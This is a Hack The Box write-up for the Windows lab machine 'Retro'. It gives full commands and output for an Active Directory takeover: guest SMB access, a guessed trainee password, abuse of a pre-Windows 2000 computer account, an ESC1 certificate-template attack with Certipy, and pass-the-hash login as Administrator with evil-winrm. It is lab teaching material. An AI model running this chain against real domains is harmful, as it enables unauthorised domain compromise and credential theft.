---
layout: writeup
category: HTB
date: 2024-12-29
comments: false
tags: windows active-directory smb ldap kerberos adcs esc1 certipy pre2k impacket winrm evil-winrm
---

<br />

![1](../../../assets/images/Retro/retro.png)

<br />

OS -> Windows.

Difficulty -> Easy.

<br />

# Introduction:

<br />



<br />

# Enumeration:

<br />

We start by running an `nmap` scan to see which ports are open:

<br />

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-30 17:55 CET
Nmap scan report for 10.129.28.100
Host is up (0.044s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-30 16:56:01Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-12-30T16:43:25
|_Not valid after:  2026-12-30T16:43:25
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-12-30T16:43:25
|_Not valid after:  2026-12-30T16:43:25
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-12-30T16:43:25
|_Not valid after:  2026-12-30T16:43:25
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-12-30T16:43:25
|_Not valid after:  2026-12-30T16:43:25
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-12-29T16:52:34
|_Not valid after:  2026-06-30T16:52:34
|_ssl-date: 2025-12-30T16:57:29+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-30T16:56:50+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
57240/tcp open  msrpc         Microsoft Windows RPC
58675/tcp open  msrpc         Microsoft Windows RPC
58694/tcp open  msrpc         Microsoft Windows RPC
62391/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
62399/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-12-30T16:56:52
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.78 seconds
```

<br />

Relevant open ports:

- `Port 53`   -> dns

- `Port 88`   -> kerberos

- `Port 135`  -> rpc

- `Port 139`  -> netbios

- `Port 389`  -> ldap

- `Port 445`  -> smb

- `Port 464`  -> kpasswd (kerberos password change)

- `Port 593`  -> rpc over http

- `Port 636`  -> ldaps

- `Port 5985` -> winrm

<br />

The domain `retro.vl` and the hostname `DC.retro.vl` appear across multiple services and ports, so I’ll add them to my `/etc/hosts` file:

<br />

```bash
10.129.28.100 retro.vl DC.retro.vl
```

<br />

# SMB Enumeration: -> Port 445 

<br />

To start enumerating this service, we'll run a basic [NetExec](https://github.com/Pennyw0rth/NetExec) oneliner to gather some information about the Windows system that we're auditing:

<br />

```bash
❯ netexec smb retro.vl
SMB         10.129.28.100   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
```

<br />

However, by using a random username we obtain a guest session:

<br />

```bash
❯ netexec smb retro.vl -u test -p "" --shares
SMB         10.129.28.100   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.28.100   445    DC               [+] retro.vl\test: (Guest)
SMB         10.129.28.100   445    DC               [*] Enumerated shares
SMB         10.129.28.100   445    DC               Share           Permissions     Remark
SMB         10.129.28.100   445    DC               -----           -----------     ------
SMB         10.129.28.100   445    DC               ADMIN$                          Remote Admin
SMB         10.129.28.100   445    DC               C$                              Default share
SMB         10.129.28.100   445    DC               IPC$            READ            Remote IPC
SMB         10.129.28.100   445    DC               NETLOGON                        Logon server share 
SMB         10.129.28.100   445    DC               Notes                           
SMB         10.129.28.100   445    DC               SYSVOL                          Logon server share 
SMB         10.129.28.100   445    DC               Trainees        READ     
```

<br />

The `Trainees` share is uncommon in default Windows environments.

We can connect to this share with `smbclient` and download the available .txt file:

<br />

```bash
❯ smbclient //retro.vl/Trainees -U "test"
Password for [WORKGROUP\test]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jul 23 23:58:43 2023
  ..                                DHS        0  Wed Jun 11 16:17:10 2025
  Important.txt                       A      288  Mon Jul 24 00:00:13 2023

		4659711 blocks of size 4096. 1327135 blocks available
smb: \> get Important.txt 
getting file \Important.txt of size 288 as Important.txt (1,7 KiloBytes/sec) (average 1,7 KiloBytes/sec)
```

<br />

The file contains the following message:

<br />

```bash
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins
```

<br />

Apparently, this is an admin message addressed to all trainees in the company. It suggests that there is a shared trainee account with a weak, generic password.

After seeing this, one thing we should try is logging in using the weak credentials `trainee:trainee`:

<br />

```bash
❯ netexec smb retro.vl -u "trainee" -p "trainee" --shares
SMB         10.129.28.100   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.28.100   445    DC               [+] retro.vl\trainee:trainee 
SMB         10.129.28.100   445    DC               [*] Enumerated shares
SMB         10.129.28.100   445    DC               Share           Permissions     Remark
SMB         10.129.28.100   445    DC               -----           -----------     ------
SMB         10.129.28.100   445    DC               ADMIN$                          Remote Admin
SMB         10.129.28.100   445    DC               C$                              Default share
SMB         10.129.28.100   445    DC               IPC$            READ            Remote IPC
SMB         10.129.28.100   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.28.100   445    DC               Notes           READ            
SMB         10.129.28.100   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.28.100   445    DC               Trainees        READ
```

<br />

This account has access to another share: `Notes`

Inside this share, there are two .txt files:

- The user flag: user.txt.

- A task list: ToDo.txt

<br />

```bash
❯ smbclient //retro.vl/Notes -U "trainee"
Password for [WORKGROUP\trainee]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  9 05:12:49 2025
  ..                                DHS        0  Wed Jun 11 16:17:10 2025
  ToDo.txt                            A      248  Mon Jul 24 00:05:56 2023
  user.txt                            A       32  Wed Apr  9 05:13:01 2025

		4659711 blocks of size 4096. 1325185 blocks available
smb: \> get ToDo.txt 
getting file \ToDo.txt of size 248 as ToDo.txt (1,5 KiloBytes/sec) (average 1,5 KiloBytes/sec)
smb: \> get user.txt 
getting file \user.txt of size 32 as user.txt (0,2 KiloBytes/sec) (average 0,9 KiloBytes/sec)
```

<br />

The `user.txt` contains the flag:

<br />

```bash
❯ cat user.txt
cbda362cff2099072c5e96c51712ff33
```

<br />

The `ToDo.txt` file contains the following message:

<br />

```bash
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James
```

<br />

This time, it is a personal message from James to Thomas. In that message, James advises Thomas about an old pre-created account related to banking software that needs to be cleaned up.

<br />

### Pre-Windows 2000:

<br />

When a new computer account is configured as a "pre-Windows 2000 computer account", its password is set based on its name. This type of account can be discovered using a `NetExec` module called `pre2k`.

To use it, we only need to run it as follows:

<br />

```bash
❯ nxc ldap retro.vl -u trainee -p trainee -M pre2k
LDAP        10.129.28.100   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.28.100   389    DC               [+] retro.vl\trainee:trainee 
PRE2K       10.129.28.100   389    DC               Pre-created computer account: BANKING$
PRE2K       10.129.28.100   389    DC               [+] Found 1 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/retro.vl/precreated_computers.txt
PRE2K       10.129.28.100   389    DC               [+] Successfully obtained TGT for banking@retro.vl
PRE2K       10.129.28.100   389    DC               [+] Successfully obtained TGT for 1 pre-created computer accounts. Saved to /root/.nxc/modules/pre2k/ccache
```

<br />

The output confirms that there is a pre-created computer account: `BANKING$`.

We can confirm that this computer account is using its name as password by running:

<br />

```bash
❯ nxc smb retro.vl -u 'BANKING$' -p banking
SMB         10.129.28.100   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.28.100   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
```

<br />

The `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` message confirms it.

<br />

## Password change

<br />

At this point, we should change the password of the pre-created account using [rpcchangepwd.py](https://raw.githubusercontent.com/api0cradle/impacket/a1d0cc99ff1bd4425eddc1b28add1f269ff230a6/examples/rpcchangepwd.py):

<br />

```bash
❯ python3 rpcchangepwd.py retro.vl/Banking\$:banking@10.129.28.100 -newpass 'NewPass123!'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Password was changed successfully.
```

<br />

With the password changed, we can continue enumerating.

However, trying WinRM or enumerating additional shares does not give us anything useful yet.

<br />

## Certipy - ESC1

<br />

A simple `Certipy` one-liner shows a vulnerable template:

<br />

```bash
❯ certipy find -vulnerable -u 'BANKING$@retro.vl' -p 'NewPass123!' -stdout
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'retro-DC-CA' via CSRA
[!] Got error while trying to get CA configuration for 'retro-DC-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'retro-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Got CA configuration for 'retro-DC-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : retro-DC-CA
    DNS Name                            : DC.retro.vl
    Certificate Subject                 : CN=retro-DC-CA, DC=retro, DC=vl
    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
    Certificate Validity End            : 2028-07-23 21:13:50+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : RETRO.VL\Administrators
      Access Rights
        ManageCertificates              : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        ManageCa                        : RETRO.VL\Administrators
                                          RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Enroll                          : RETRO.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : RetroClients
    Display Name                        : Retro Clients
    Certificate Authorities             : retro-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : None
    Extended Key Usage                  : Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
        Write Property Principals       : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
                                          RETRO.VL\Administrator
    [!] Vulnerabilities
      ESC1                              : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

<br />

The template is named `RetroClients` and it's vulnerable to `ESC1`.

<br />

This vulnerability allows us to request a certificate for other accounts in the domain, including `Administrator`.

To exploit this, we request a new certificate using the UPN: `administrator@retro.vl`.

<br />

```bash
❯ certipy req -u 'BANKING$@retro.vl' -p 'NewPass123!' -upn 'administrator@retro.vl' -ca retro-DC-CA -template RetroClients -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

<br />

Now, we use this certificate to authenticate as administrator:

<br />

```bash
❯ certipy auth -pfx administrator.pfx -dc-ip 10.129.28.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
```

<br />

We get an error: `Object SID mismatch`.

This error means that SID of the host doesn't match the SID in our certificate.

We can retrieve the domain SID using `lookupsid.py`:

<br />

```bash
❯ lookupsid.py retro.vl/BANKING$:'NewPass123!'@retro.vl
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at retro.vl
[*] StringBinding ncacn_np:retro.vl[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```

<br />

Then, we request the certificate again specifying this SID:

<br />

```bash
❯ certipy req -u 'BANKING$@retro.vl' -p 'NewPass123!' -upn 'administrator@retro.vl' -ca retro-DC-CA -template RetroClients -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 12
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saved certificate and private key to 'administrator.pfx'
```

<br />

Now, we can use it with the auth command without any problem:

<br />

```bash
❯ certipy auth -pfx administrator.pfx -dc-ip 10.129.28.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@retro.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

<br />

The retrieved hash allows us to log in as `administrator` using `evil-winrm`:

<br />

```bash
❯ evil-winrm -i retro.vl -u administrator -H 252fac7066d93dd009d4fd2cd0368389
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
retro\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
DC
```

<br />

The `root.txt` flag was successfully retrieved:

<br />

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
40fce9c3f09024bcab29d377eexxxxxx
```

<br />

Box compromised.

I hope you learned a lot and enjoyed this writeup.

Keep hacking! ❤️❤️

<br />
